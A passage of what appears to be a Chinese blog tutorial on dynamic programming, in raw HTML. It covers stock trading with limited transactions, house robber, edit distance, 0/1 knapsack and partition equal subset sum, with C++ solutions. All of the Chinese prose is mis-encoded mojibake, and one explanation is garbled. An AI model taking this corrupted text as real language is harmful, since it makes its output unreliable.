class="hljs-selector-attr">[i]</span>)<br></code></pre></td></tr></table></figure><ul><li>å¦‚æœåœ¨ç¬¬ <code>i</code> å¤©é€‰æ‹©å–å‡ºè‚¡ç¥¨ï¼Œé‚£ä¹ˆå‰ä¸€å¤©çš„çŠ¶æ€åº”è¯¥æ˜¯æŒæœ‰è‚¡ç¥¨ä¸”å·²å®Œæˆ <code>k</code> æ¬¡äº¤æ˜“ï¼Œå–å‡ºåå¢åŠ å½“å¤©çš„ä»·æ ¼ <code>prices[i]</code>ã€‚</li></ul></li><li><p>ä¿æŒ</p><p>ï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">f<span class="hljs-comment">[i]</span><span class="hljs-comment">[j]</span><span class="hljs-comment">[k]</span> = f<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[j]</span><span class="hljs-comment">[k]</span><br></code></pre></td></tr></table></figure><ul><li>ä¸è¿›è¡Œä¹°å–æ“ä½œï¼Œä¿æŒå‰ä¸€å¤©çš„çŠ¶æ€ã€‚</li></ul></li></ul><p>è¾¹ç•Œæ¡ä»¶</p><ul><li><code>f[0][0][0] = 0</code> è¡¨ç¤ºåœ¨ç¬¬ 0 å¤©ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•äº¤æ˜“ä¸”ä¸æŒæœ‰è‚¡ç¥¨çš„æƒ…å†µä¸‹ï¼Œåˆ©æ¶¦ä¸º 0ã€‚</li><li>å…¶ä½™çš„è¾¹ç•Œå€¼éƒ½åˆå§‹åŒ–ä¸ºè´Ÿæ— ç©·ï¼Œè¡¨ç¤ºåœ¨å¼€å§‹æ—¶è¿™äº›çŠ¶æ€ä¸åˆæ³•æˆ–ä¸å¯è¾¾ã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-type">int</span> c, std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; prices)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = prices.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// ç§»åŠ¨ç´¢å¼•åˆ°1å¼€å§‹</span><br>        prices.<span class="hljs-built_in">insert</span>(prices.<span class="hljs-built_in">begin</span>(), <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// å®šä¹‰ f æ•°ç»„å¹¶åˆå§‹åŒ–ä¸ºè´Ÿæ— ç©·</span><br>        <span class="hljs-comment">// f[i][j][k] è¡¨ç¤ºç¬¬ i å¤©ï¼ŒæŒæœ‰ j (0 æˆ– 1) è‚¡è‚¡ç¥¨ï¼Œå·²ç»äº¤æ˜“äº† k æ¬¡çš„æœ€å¤§æ”¶ç›Š</span><br>        std::vector&lt;std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt;&gt; <span class="hljs-built_in">f</span>(n + <span class="hljs-number">1</span>, std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt;(<span class="hljs-number">2</span>, std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(c + <span class="hljs-number">1</span>, <span class="hljs-number">-1e9</span>)));<br>        <br>        <span class="hljs-comment">// è¾¹ç•Œæ¡ä»¶</span><br>        f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// éå†æ‰€æœ‰çŠ¶æ€</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">2</span>; j++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= c; k++) &#123;<br>                    <span class="hljs-comment">// å†³ç­–ï¼šä¸æ“ä½œ</span><br>                    f[i][j][k] = std::<span class="hljs-built_in">max</span>(f[i][j][k], f[i - <span class="hljs-number">1</span>][j][k]);<br>                    <br>                    <span class="hljs-comment">// å†³ç­–ï¼šä¹°å…¥</span><br>                    <span class="hljs-keyword">if</span> (j == <span class="hljs-number">1</span> &amp;&amp; k &gt; <span class="hljs-number">0</span>) &#123;<br>                        f[i][<span class="hljs-number">1</span>][k] = std::<span class="hljs-built_in">max</span>(f[i][<span class="hljs-number">1</span>][k], f[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>][k - <span class="hljs-number">1</span>] - prices[i]);<br>                    &#125;<br>                    <br>                    <span class="hljs-comment">// å†³ç­–ï¼šå–å‡º</span><br>                    <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span> &amp;&amp; k &gt; <span class="hljs-number">0</span>) &#123;<br>                        f[i][<span class="hljs-number">0</span>][k] = std::<span class="hljs-built_in">max</span>(f[i][<span class="hljs-number">0</span>][k], f[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>][k] + prices[i]);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// æ‰¾åˆ°æœ€å¤§çš„æ”¶ç›Š</span><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">-1e9</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= c; k++) &#123;<br>            ans = std::<span class="hljs-built_in">max</span>(ans, f[n][<span class="hljs-number">0</span>][k]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="æ‰“å®¶åŠ«èˆ"><a href="#æ‰“å®¶åŠ«èˆ" class="headerlink" title="æ‰“å®¶åŠ«èˆ"></a>æ‰“å®¶åŠ«èˆ</h4><p>é—®é¢˜æè¿°</p><ul><li>ç»™å®šä¸€æ’æˆ¿å­ï¼Œæ¯ä¸ªæˆ¿å­éƒ½æœ‰ä¸€å®šçš„ç°é‡‘ã€‚å¦‚æœä¸¤ä¸ªç›¸é‚»çš„æˆ¿å­éƒ½è¢«ç›—ï¼Œå°±ä¼šè§¦å‘æŠ¥è­¦ç³»ç»Ÿã€‚æ±‚åœ¨ä¸è§¦å‘æŠ¥è­¦çš„æƒ…å†µä¸‹èƒ½å¤Ÿç›—å–çš„æœ€å¤§é‡‘é¢ã€‚</li></ul><p>çŠ¶æ€å®šä¹‰</p><ul><li>è®¾ f[i][j] è¡¨ç¤ºåœ¨ç¬¬ iä¸ªæˆ¿å­æ—¶çš„æœ€å¤§æ”¶ç›Šï¼š<ul><li><code>j = 0</code> è¡¨ç¤ºæœªç›—çªƒç¬¬ <code>i</code> ä¸ªæˆ¿å­ã€‚</li><li><code>j = 1</code> è¡¨ç¤ºç›—çªƒç¬¬ <code>i</code> ä¸ªæˆ¿å­ã€‚</li></ul></li></ul><p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</p><ul><li><code>f[i][0] = max(f[i - 1][0], f[i - 1][1])</code>ï¼šå¦‚æœç¬¬ <code>i</code> ä¸ªæˆ¿å­æ²¡æœ‰è¢«ç›—çªƒï¼Œé‚£ä¹ˆæœ€å¤§æ”¶ç›Šå°±æ˜¯å‰ä¸€ä¸ªæˆ¿å­çš„çŠ¶æ€ï¼ˆä¸ç®¡å‰ä¸€ä¸ªæˆ¿å­æ˜¯å¦è¢«ç›—ï¼‰ã€‚</li><li><code>f[i][1] = f[i - 1][0] + nums[i]</code>ï¼šå¦‚æœç¬¬ <code>i</code> ä¸ªæˆ¿å­è¢«ç›—çªƒï¼Œé‚£ä¹ˆå‰ä¸€ä¸ªæˆ¿å­ä¸€å®šæ²¡æœ‰è¢«ç›—çªƒã€‚</li></ul><p>è¾¹ç•Œæ¡ä»¶</p><ul><li><code>f[0][0] = 0</code>ï¼šç¬¬ä¸€ä¸ªæˆ¿å­ä¸å·çš„æ”¶ç›Šä¸º 0ã€‚</li><li><code>f[0][1] = nums[0]</code>ï¼šç¬¬ä¸€ä¸ªæˆ¿å­å·çš„æ”¶ç›Šä¸º <code>nums[0]</code>ã€‚</li></ul><p>ç›®æ ‡</p><ul><li>è®¡ç®— <code>max(f[n][0], f[n][1])</code>ï¼Œå…¶ä¸­ <code>n</code> æ˜¯æˆ¿å­çš„æ•°é‡ï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°åœ¨æœ€åä¸€ä¸ªæˆ¿å­æ—¶çš„æœ€å¤§æ”¶ç›Šã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// ä¸ºæ–¹ä¾¿ä½¿ç”¨1åŸºç´¢å¼•ï¼Œæˆ‘ä»¬åœ¨å¼€å¤´æ’å…¥0</span><br>        nums.<span class="hljs-built_in">insert</span>(nums.<span class="hljs-built_in">begin</span>(), <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// å®šä¹‰fæ•°ç»„ï¼Œå¹¶åˆå§‹åŒ–ä¸ºè´Ÿæ— ç©·å¤§ï¼ˆè¡¨ç¤ºä¸å¯è¾¾çŠ¶æ€ï¼‰</span><br>        std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">f</span>(n + <span class="hljs-number">1</span>, std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">2</span>, <span class="hljs-number">-1e9</span>));<br>        f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// è¾¹ç•Œæ¡ä»¶ï¼Œç¬¬0å¤©ä¸å·çš„æ”¶ç›Šä¸º0</span><br><br>        <span class="hljs-comment">// åŠ¨æ€è§„åˆ’å¡«è¡¨</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            <span class="hljs-comment">// ä¸å·ç¬¬iä¸ªæˆ¿å­</span><br>            f[i][<span class="hljs-number">0</span>] = std::<span class="hljs-built_in">max</span>(f[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>], f[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br>            <span class="hljs-comment">// å·ç¬¬iä¸ªæˆ¿å­</span><br>            f[i][<span class="hljs-number">1</span>] = f[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + nums[i];<br>        &#125;<br><br>        <span class="hljs-comment">// è¿”å›æœ€åä¸€å¤©ä¸å·æˆ–å·çš„æœ€å¤§æ”¶ç›Š</span><br>        <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">max</span>(f[n][<span class="hljs-number">0</span>], f[n][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;;<br><br><br></code></pre></td></tr></table></figure><h4 id="ç¼–è¾‘è·ç¦»"><a href="#ç¼–è¾‘è·ç¦»" class="headerlink" title="ç¼–è¾‘è·ç¦»"></a>ç¼–è¾‘è·ç¦»</h4><p>ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² <code>word1</code> å’Œ <code>word2</code>ï¼Œè®¡ç®—å°† <code>word1</code> è½¬æ¢æˆ <code>word2</code> æ‰€ä½¿ç”¨çš„æœ€å°æ“ä½œæ•°ã€‚å¯ä»¥å¯¹å­—ç¬¦ä¸²æ‰§è¡Œä»¥ä¸‹ä¸‰ç§æ“ä½œï¼š</p><ol><li>æ’å…¥ä¸€ä¸ªå­—ç¬¦</li><li>åˆ é™¤ä¸€ä¸ªå­—ç¬¦</li><li>æ›¿æ¢ä¸€ä¸ªå­—ç¬¦</li></ol><p>çŠ¶æ€å®šä¹‰</p><p>è®¾ <code>f[i][j]</code> è¡¨ç¤º <code>word1</code> å‰ <code>i</code> ä¸ªå­—ç¬¦å’Œ <code>word2</code> å‰ <code>j</code> ä¸ªå­—ç¬¦ä¹‹é—´çš„ç¼–è¾‘è·ç¦»ï¼ˆæœ€å°æ“ä½œæ•°ï¼‰ã€‚</p><p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</p><ul><li><strong>æ’å…¥æ“ä½œ</strong>ï¼š<code>f[i][j] = f[i][j - 1] + 1</code><ul><li>ç›¸å½“äºåœ¨ <code>word1</code> ä¸­ç¬¬ <code>i</code> ä¸ªä½ç½®æ’å…¥ <code>word2[j]</code>ï¼Œæ‰€ä»¥ <code>j</code> å‡ 1 åè®¡ç®—å‰©ä½™çš„ç¼–è¾‘è·ç¦»ï¼Œå†åŠ ä¸Šæ’å…¥æ“ä½œçš„1ã€‚</li></ul></li><li><strong>åˆ é™¤æ“ä½œ</strong>ï¼š<code>f[i][j] = f[i - 1][j] + 1</code><ul><li>ç›¸å½“äºåˆ é™¤ <code>word1[i]</code>ï¼Œå› æ­¤ <code>i</code> å‡ 1 åè®¡ç®—å‰©ä½™çš„ç¼–è¾‘è·ç¦»ï¼Œå†åŠ ä¸Šåˆ é™¤æ“ä½œçš„1ã€‚</li></ul></li><li><strong>æ›¿æ¢æ“ä½œ</strong>ï¼ˆæˆ–ä¸å˜ï¼‰ï¼š<code>f[i][j] = f[i - 1][j - 1] + eq</code>ï¼Œå…¶ä¸­ <code>eq = 0</code> æˆ– <code>1</code><ul><li>å¦‚æœ <code>word1[i]</code> ä¸ <code>word2[j]</code> ç›¸ç­‰ï¼Œ<code>eq = 0</code>ï¼›å¦åˆ™ï¼Œ<code>eq = 1</code>ï¼Œå› ä¸ºéœ€è¦ä¸€æ¬¡æ›¿æ¢æ“ä½œã€‚</li></ul></li></ul><p>åˆå§‹æ¡ä»¶</p><ul><li><code>f[i][0] = i</code>ï¼šå°† <code>word1</code> çš„å‰ <code>i</code> ä¸ªå­—ç¬¦è½¬åŒ–ä¸ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²éœ€è¦ <code>i</code> æ¬¡åˆ é™¤æ“ä½œã€‚</li><li><code>f[0][j] = j</code>ï¼šå°†ç©ºå­—ç¬¦ä¸²è½¬åŒ–ä¸º <code>word2</code> çš„å‰ <code>j</code> ä¸ªå­—ç¬¦éœ€è¦ <code>j</code> æ¬¡æ’å…¥æ“ä½œã€‚</li></ul><p>ç›®æ ‡</p><p>æœ€ç»ˆç›®æ ‡æ˜¯è®¡ç®— <code>f[n][m]</code>ï¼Œå…¶ä¸­ <code>n</code> å’Œ <code>m</code> åˆ†åˆ«æ˜¯ <code>word1</code> å’Œ <code>word2</code> çš„é•¿åº¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">minDistance</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> word1, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> word2)</span> &#123;<br>        <span class="hljs-type">int</span> n = word1.length();<br>        <span class="hljs-type">int</span> m = word2.length();<br>        <br>        <span class="hljs-comment">// å®šä¹‰ f[i][j] å¹¶åˆå§‹åŒ–è¾¹ç•Œ</span><br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; f(n + <span class="hljs-number">1</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(m + <span class="hljs-number">1</span>, <span class="hljs-number">1e9</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= n; i++) f[i][<span class="hljs-number">0</span>] = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= m; j++) f[<span class="hljs-number">0</span>][j] = j;<br><br>        <span class="hljs-comment">// è®¡ç®—ç¼–è¾‘è·ç¦»</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= m; j++) &#123;<br>                <span class="hljs-type">int</span> eq = (word1[i - <span class="hljs-number">1</span>] == word2[j - <span class="hljs-number">1</span>]) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br>                f[i][j] = <span class="hljs-built_in">std</span>::min(&#123;f[i][j - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>,    <span class="hljs-comment">// æ’å…¥</span><br>                                    f[i - <span class="hljs-number">1</span>][j] + <span class="hljs-number">1</span>,    <span class="hljs-comment">// åˆ é™¤</span><br>                                    f[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + eq&#125;);  <span class="hljs-comment">// æ›¿æ¢æˆ–ä¸å˜</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// è¿”å›æœ€ç»ˆçš„ç¼–è¾‘è·ç¦»</span><br>        <span class="hljs-keyword">return</span> f[n][m];<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="0-1-èƒŒåŒ…"><a href="#0-1-èƒŒåŒ…" class="headerlink" title="0&#x2F;1 èƒŒåŒ…"></a><strong>0&#x2F;1 èƒŒåŒ…</strong></h3><p>ç»™å®š <code>N</code> ä¸ªç‰©å“ï¼Œæ¯ä¸ªç‰©å“æœ‰ä¸€å®šçš„ä½“ç§¯ <code>V[i]</code> å’Œä»·å€¼ <code>W[i]</code>ã€‚è¿˜æœ‰ä¸€ä¸ªå®¹é‡ä¸º <code>M</code> çš„èƒŒåŒ…ï¼Œè¦æ±‚åœ¨èƒŒåŒ…å®¹é‡ä¸è¶…è¿‡ <code>M</code> çš„å‰æä¸‹ï¼Œé€‰æ‹©ä¸€äº›ç‰©å“æ”¾å…¥èƒŒåŒ…ï¼Œä½¿ç‰©å“çš„æ€»ä»·å€¼æœ€å¤§ã€‚</p><p>æ¨¡ç‰ˆ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">knapsack</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; V, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; W)</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = V.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(M + <span class="hljs-number">1</span>, <span class="hljs-number">-1e9</span>)</span></span>; <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºè´Ÿæ— ç©·</span><br>    f[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// æ²¡æœ‰ç‰©å“ä¸”å®¹é‡ä¸º0çš„åˆå§‹çŠ¶æ€</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123; <span class="hljs-comment">// éå†æ¯ä¸ªç‰©å“</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = M; j &gt;= V[i]; --j) &#123; <span class="hljs-comment">// å€’åºéå†å®¹é‡ï¼Œç¡®ä¿æ¯ä¸ªç‰©å“ä»…é€‰æ‹©ä¸€æ¬¡</span><br>            f[j] = <span class="hljs-built_in">max</span>(f[j], f[j - V[i]] + W[i]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å¯»æ‰¾å®¹é‡ä¸º M æ—¶çš„æœ€å¤§ä»·å€¼</span><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= M; ++j) &#123;<br>        ans = <span class="hljs-built_in">max</span>(ans, f[j]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="åˆ†å‰²ç­‰å’Œå­é›†"><a href="#åˆ†å‰²ç­‰å’Œå­é›†" class="headerlink" title="åˆ†å‰²ç­‰å’Œå­é›†"></a>åˆ†å‰²ç­‰å’Œå­é›†</h4><p>é—®é¢˜æè¿°æ˜¯ï¼šç»™å®šä¸€ä¸ªåªåŒ…å«æ­£æ•´æ•°çš„éç©ºæ•°ç»„ï¼Œåˆ¤æ–­æ˜¯å¦å¯ä»¥å°†æ•°ç»„åˆ†å‰²æˆä¸¤ä¸ªå­é›†ï¼Œä½¿å¾—ä¸¤ä¸ªå­é›†çš„å’Œç›¸ç­‰ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ 0&#x2F;1 èƒŒåŒ…é—®é¢˜ï¼Œé—®é¢˜å¯ä»¥è½¬åŒ–ä¸ºï¼šæ˜¯å¦å¯ä»¥ä»æ•°ç»„ä¸­é€‰æ‹©ä¸€äº›æ•°ï¼Œä½¿å…¶å’Œç­‰äºæ€»å’Œçš„ä¸€åŠã€‚å› ä¸ºèƒŒåŒ…å…¶å®å°±æ˜¯ä½ çœ‹æ¯ä¸ªç‰©å“é€‰ä¸é€‰?å­é›†åœ¨ä¸€ä¸ªæ ¸çš„é™åˆ¶ä¸‹ã€‚é€‰æ•°çš„é—®é¢˜å°±è·ŸèƒŒåŒ…ä¸€æ ·ï¼Œæ­£å¥½æ˜¯é€‰å‡ºæ¥æ€»ä½“ç§¯ä¸ºä¸‰-2è¿™æ ·çš„ç‰©å“ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canPartition</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) sum += num;<br>        <span class="hljs-keyword">if</span> (sum % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-type">int</span> target = sum / <span class="hljs-number">2</span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(target + <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>)</span></span>;<br>        f[<span class="hljs-number">0</span>] = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = target; j &gt;= num; --j) &#123;<br>                f[j] = f[j] || f[j - num];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> f[target];<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="å®Œå…¨èƒŒåŒ…é—®é¢˜"><a href="#å®Œå…¨èƒŒåŒ…é—®é¢˜" class="headerlink" title="å®Œå…¨èƒŒåŒ…é—®é¢˜"></a><strong>å®Œå…¨èƒŒåŒ…é—®é¢˜</strong></h3><p>ç»™å®š NNN ç§ç‰©å“ï¼Œå…¶ä¸­ç¬¬ iii ç§ç‰©å“çš„ä½“ç§¯ä¸º ViV_iViï¼Œä»·å€¼ä¸º WiW_iWiï¼Œå¹¶ä¸”æ¯ç§ç‰©å“æœ‰æ— é™ä¸ªã€‚ç°åœ¨æœ‰ä¸€ä¸ªå®¹é‡ä¸º MMM 